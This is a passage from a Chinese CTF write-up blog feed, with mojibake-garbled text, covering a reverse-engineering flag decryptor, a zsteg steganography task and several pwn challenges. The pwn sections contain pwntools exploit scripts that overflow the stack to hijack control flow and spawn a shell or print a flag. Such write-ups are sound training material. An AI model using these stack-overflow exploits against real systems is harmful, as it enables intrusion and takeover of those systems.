class="number">0</span>,  <span class="number">38</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">246</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">198</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">220</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">131</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">101</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">251</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">46</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">135</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">233</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">34</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x32</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x30</span>, <span class="number">0xA5</span>, <span class="number">0x7F</span>, <span class="number">0xF0</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, </span><br><span class="line">  <span class="number">0xE5</span>, <span class="number">0x52</span>, <span class="number">0xC7</span>, <span class="number">0x53</span>, <span class="number">0xC0</span>, <span class="number">0x2D</span>, <span class="number">0xBE</span>, <span class="number">0xEC</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x2E</span>, <span class="number">0xB5</span>, <span class="number">0x44</span>, <span class="number">0x15</span>, <span class="number">0x57</span>, <span class="number">0xDC</span>, <span class="number">0x9F</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x42</span>, <span class="number">0xFF</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0xA6</span>, <span class="number">0x33</span>, <span class="number">0x5F</span>, <span class="number">0x5C</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xA8</span>, <span class="number">0xFE</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0x24</span>, <span class="number">0x6C</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xA1</span>, <span class="number">0x50</span>, <span class="number">0xC5</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x16</span>, <span class="number">0x55</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0xD8</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0x88</span>, <span class="number">0xB7</span>, <span class="number">0xE6</span>, <span class="number">0x3E</span>, <span class="number">0x70</span>, <span class="number">0x86</span>, <span class="number">0x9E</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0xCA</span>, <span class="number">0x95</span>, <span class="number">0xB2</span>, <span class="number">0x51</span>, <span class="number">0xAF</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x28</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0xBC</span>, <span class="number">0x9B</span>, <span class="number">0x85</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x84</span>, <span class="number">0xBF</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xBA</span>, <span class="number">0x46</span>, <span class="number">0xB8</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x3D</span>, <span class="number">0xB0</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>, <span class="number">0x38</span>, <span class="number">0x5A</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, <span class="number">0x40</span>, <span class="number">0x1B</span>, <span class="number">0xF8</span>, <span class="number">0xED</span>, <span class="number">0x82</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0xE3</span>, <span class="number">0x10</span>, <span class="number">0xB4</span>, <span class="number">0x39</span>, <span class="number">0x3C</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0xBD</span>, <span class="number">0xF4</span>, <span class="number">0x5D</span>, <span class="number">0x91</span>, <span class="number">0x1F</span>, </span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x8C</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>, <span class="number">0x7B</span>, <span class="number">0x99</span>, <span class="number">0xC3</span>, <span class="number">0xD6</span>, <span class="number">0x29</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0xC9</span>, <span class="number">0x4E</span>, <span class="number">0xCF</span>, <span class="number">0xDB</span>, <span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x03</span>, <span class="number">0xB9</span>, <span class="number">0xA7</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x69</span>, <span class="number">0x05</span>, <span class="number">0x1D</span>, <span class="number">0xEF</span>, <span class="number">0x0B</span>, <span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0xBB</span>, <span class="number">0x17</span>, <span class="number">0xD2</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, <span class="number">0x2C</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x61</span>, <span class="number">0xCB</span>, <span class="number">0xAD</span>, <span class="number">0x9A</span>, <span class="number">0xA4</span>, <span class="number">0xF3</span>, <span class="number">0x0A</span>, <span class="number">0xA0</span>, <span class="number">0x14</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0x92</span>, <span class="number">0x0D</span>, <span class="number">0x5E</span>, <span class="number">0xA9</span>, <span class="number">0xD5</span>, <span class="number">0x90</span>, <span class="number">0x96</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x76</span>, <span class="number">0x45</span>, <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0x34</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0xFB</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x7D</span>, <span class="number">0x06</span>, <span class="number">0x9D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0xF7</span>, <span class="number">0x97</span>, <span class="number">0x60</span>, <span class="number">0xE1</span>, <span class="number">0xD9</span>, </span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x6E</span>, <span class="number">0x4B</span>, <span class="number">0x31</span>, <span class="number">0xE9</span>, <span class="number">0x43</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="number">0</span>, v7 = <span class="number">0</span>, v5 = <span class="number">0</span>, ans[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">296</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[j++] = *(<span class="keyword">long</span> <span class="keyword">int</span> *)(&amp;ida_chars[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v6 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v6 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + a[v6]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">v7 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v5 + v7 + a[v6]) - v5;</span><br><span class="line"><span class="keyword">int</span> temp = a[v6];</span><br><span class="line">a[v6] = a[v7];</span><br><span class="line">a[v7] = temp;</span><br><span class="line"></span><br><span class="line">flag[i] = ans[i]^a[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a[v6] + a[v7])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214751017.png" alt="image-20200626214751017"></p></li><li><p>æ€»ç»“ï¼šæ— ã€‚</p></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="é€æ˜åº¦"><a href="#é€æ˜åº¦" class="headerlink" title="é€æ˜åº¦"></a>é€æ˜åº¦</h3><p>é¢˜ç›®æè¿°ï¼šä½ çŸ¥é“RGBAå—ï¼Ÿ</p><p>ä¸‹è½½åæ˜¯ä¸€å¼ è¡¨æƒ…åŒ…ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/Rgba.png" alt="Rgba"></p><p>ä»é¢˜ç›®çš„æè¿°ä¸RGBæœ‰å…³ï¼Œæ”¾å…¥Stegsolveä¸­çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨é€æ˜çš„ç®¡é“éšè—æœ‰æ•°æ®ã€‚ä¸”é¢˜ç›®åç§°éƒ½æ˜¯é€æ˜åº¦ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094515063.png" alt="image-20200627094515063"></p><p>ç„¶åç›´æ¥æå–å‡ºé€æ˜ç®¡é“çš„æ‰€æœ‰æ•°æ®ï¼Œä½†å¼€å§‹è‡ªå·±å¤åˆ¶çš„æ•°æ®ç„¶åç²˜è´´åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ€åå¾—åˆ°çš„å‹ç¼©åŒ…ä¸€ç›´æŸåã€‚åé¢å¯¹æ¯”å‘ç°æ˜¯æ¯æ¬¡æ¢è¡Œçš„åœ°æ–¹ä¼šå‡ºé—®é¢˜ã€‚</p><p>å…¶å®ç›´æ¥save bin å•Š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094815397.png" alt="image-20200627094815397"></p><p>æœ€åå¾—åˆ°çš„è¦å‹ç¼©åŒ…æ ¹æ®æç¤ºçˆ†ç ´å‡ºå¯†ç å³å¯ï¼šnepnb</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095017830.png" alt="image-20200627095017830"></p><p>æœ€åå…¶å®è¿™ä¸ªçš„é¢˜ä½¿ç”¨zestegå¯ä»¥ç›´æ¥å¾—åˆ°å‹ç¼©åŒ…ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095200352.png" alt="image-20200627095200352"></p><p>å†ä½¿ç”¨<strong>zsteg Rgba.png -e â€˜b8,a,lsb,xyâ€™ &gt; 1.zip</strong>æå–å‡ºå‹ç¼©åŒ…ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse:&quot;&gt;&lt;/a&gt;Reverse:&lt;/h2&gt;&lt;h3 id=&quot;T0p-Gear&quot;&gt;&lt;a href=&quot;#T0p-Gear&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="CTFçº¿ä¸Š" scheme="https://www.Bxnop.cn/categories/CTF%E7%BA%BF%E4%B8%8A/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn æ”»é˜²ä¸–ç•Œï¼ˆ1ï¼‰</title>
    <link href="https://www.bxnop.cn/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/</id>
    <published>2020-06-04T05:05:44.000Z</published>
    <updated>2020-06-12T09:18:29.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><blockquote><p>æ ˆæº¢å‡º</p></blockquote><ul><li><p>idaæ‰“å¼€çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200604180206603.png" alt="image-20200604180206603"></p><a id="more"></a></li><li><p>å¯ä»¥çŸ¥é“è¿™ä¸ªéšæœºæ•°ç§å­æˆ‘ä»¬æ˜¯ä¸çŸ¥é“çš„ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡gets(v7)ï¼Œé€šè¿‡æ ˆæº¢å‡ºæŠŠè¿™ä¸ªç§å­æ¢æˆ1ï¼Œå†ç”¨1è®¡ç®—å‡ºéšæœºæ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46809</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'a'</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">l = <span class="string">'2542625142'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">p.recvuntil(<span class="string">'input'</span>)</span><br><span class="line">p.sendline(i)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200604180443703.png" alt="image-20200604180443703"></p></li><li><p><strong>æ€»ç»“ï¼šå¯¹æ ˆæ›´åŠ ç†Ÿæ‚‰ã€‚</strong></p></li></ul><hr><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><blockquote><p>æ ˆæº¢å‡ºï¼Œæ§åˆ¶ç¨‹åºèµ°å‘</p></blockquote><ul><li><p>ä½¿ç”¨checksecçœ‹ä¸€ä¿æŠ¤ï¼Œæ²¡æœ‰canaryã€‚</p></li><li><p>idaä¸­çœ‹ä¸€ä¸‹ï¼Œgets()å­˜åœ¨æº¢å‡ºï¼Œæœ‰system()å‡½æ•°ï¼Œä½†æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„shellã€‚å’Œä¹‹å‰åœ¨è®ºå‰‘åœºåšè¿‡çš„å¾ˆåƒï¼Œåªä¸è¿‡é‚£ä¸ªæ˜¯64ä½ï¼Œè¿™ä¸ªæ˜¯32ä½ï¼Œå‚æ•°ä¼ é€’ä¸åŒè€Œå·²ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605123722286.png" alt="image-20200605123722286"></p></li><li><p>å°è¯•ä½¿ç”¨ ROPgadgetæœç´¢<strong>$0</strong>,æ— æœã€‚ä½†å›åˆ°ç¨‹åºçœ‹åˆ°æœ‰ä¸€ä¸ªå…¨å±€å˜é‡è®©æˆ‘ä»¬è¾“å…¥nameï¼Œé‚£å°±è‡ªå·±æ„é€ ã€‚</p></li><li><p>æ‰¾åˆ°systemçš„åœ°å€ï¼Œå†™pyè„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53127</span>)</span><br><span class="line">s = <span class="string">'$0'</span> <span class="comment">#è¿™é‡Œä¹Ÿå¯ä»¥'/bin/sh'</span></span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x26</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>å¾—åˆ°shellã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605124200541.png" alt="image-20200605124200541"></p></li><li><p><strong>æ€»ç»“ï¼šä¸Šæ¬¡æ˜¯64ä½ï¼Œè¿™æ¬¡ä½“éªŒäº†32ä½ç¨‹åºï¼Œä¼ å‚ä¸åŒã€‚</strong></p></li></ul><hr><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><blockquote><p>æ ˆæº¢å‡ºï¼Œæ•´æ•°æº¢å‡º</p></blockquote><ul><li><p>æ²¡æœ‰å¼€å¯canaryï¼Œåœ¨idaä¸­å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªloginå‡½æ•°éƒ½ä¸å­˜åœ¨æº¢å‡ºã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605161502591.png" alt="image-20200605161502591"></p></li><li><p>ä½†ä»æœç´¢çš„å­—ç¬¦ä¸²æ‰¾åˆ°å¼•ç”¨ï¼Œæœ‰ä¸€ä¸ªsystem(â€œcat flagâ€)ï¼Œæ‰€ä»¥è¿˜æ˜¯è€ƒè™‘é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘ã€‚</p></li></ul><ul><li><p>æœç„¶åœ¨<strong>check_passwdï¼ˆ&amp;bufï¼‰</strong>å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¿™é‡Œå°±æ˜¯å¤šäº†ä¸ªæ•´æ•°æº¢å‡ºã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605161944323.png" alt="image-20200605161944323"></p></li><li><p>ç”±äºä¸€ä¸ªå­—èŠ‚æ— ç¬¦å·çš„èŒƒå›´ï¼ˆ0-255ï¼‰ï¼Œé‚£æˆ‘ä»¬æœ€å°åªè¦260å°±å¯ä»¥è®©v3==4å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54696</span>)</span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048694</span>) + (<span class="number">260</span><span class="number">-28</span>)*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605163357042.png" alt="image-20200605163357042"></p></li><li><p><strong>æ€»ç»“ï¼šå¯¹æ•´æ•°æº¢å‡ºæœ‰äº†äº†è§£ã€‚</strong></p></li></ul><hr><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><blockquote><p>æ ¼å¼åŒ–å­—ç¬¦æ¢æ¼æ´ï¼Œå†™å…¥shellcodeã€‚ä½†æ˜¯æœ‰å¾ˆå¤šé€»è¾‘å¹²æ‰°ï¼Œå…³é”®è¿˜æ˜¯åˆ†æåˆ°å¼ºåˆ¶è½¬åŒ–ä¸ºå‡½æ•°åˆ°æ‰§è¡Œï¼Œè”ç³»åˆ°æ‰§è¡Œè‡ªå·±çš„shellcodeã€‚</p></blockquote><ul><li><p>ç¨‹åºé™¤äº†åŸºå€éšæœºåŒ–ä¿æŠ¤å…³äº†ï¼Œå…¶ä»–å…¨å¼€ã€‚</p></li><li><p>è½½å…¥idaæ‰¾æ¼æ´ï¼Œæ„Ÿè§‰æœ‰ç‚¹å¤æ‚ï¼Œä¸€ä¸ªå°æ¸¸æˆï¼Œå‡½æ•°æœ‰ç‚¹å¤šã€‚ä½†æ˜¯ç”±äºæ²¡æœ‰å…³é”®å­—ç¬¦ä¸²ä¸systemï¼ˆï¼‰å‡½æ•°ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å¾€å†™shellcodeæ–¹é¢æƒ³ã€‚æœç„¶åœ¨<strong>sub_400CA6((_DWORD *)a1);</strong>ä¸­æ‰¾åˆ°äº†ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605203928195.png" alt="image-20200605203928195"></p></li><li><p>ä½†è¦ä½¿æ•´ä¸ªå‡½æ•°æ‰§è¡Œï¼Œä¸Šé¢æœ‰ä¸ªåˆ¤æ–­ï¼Œ<strong>*a1 == a1[1]</strong>ï¼Œå¯»æ‰¾*a1çš„å‚æ•°æ¥æºï¼Œå¯ä»¥çŸ¥é“ä½¿main()å‡½æ•°é‡Œçš„v4ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605221940761.png" 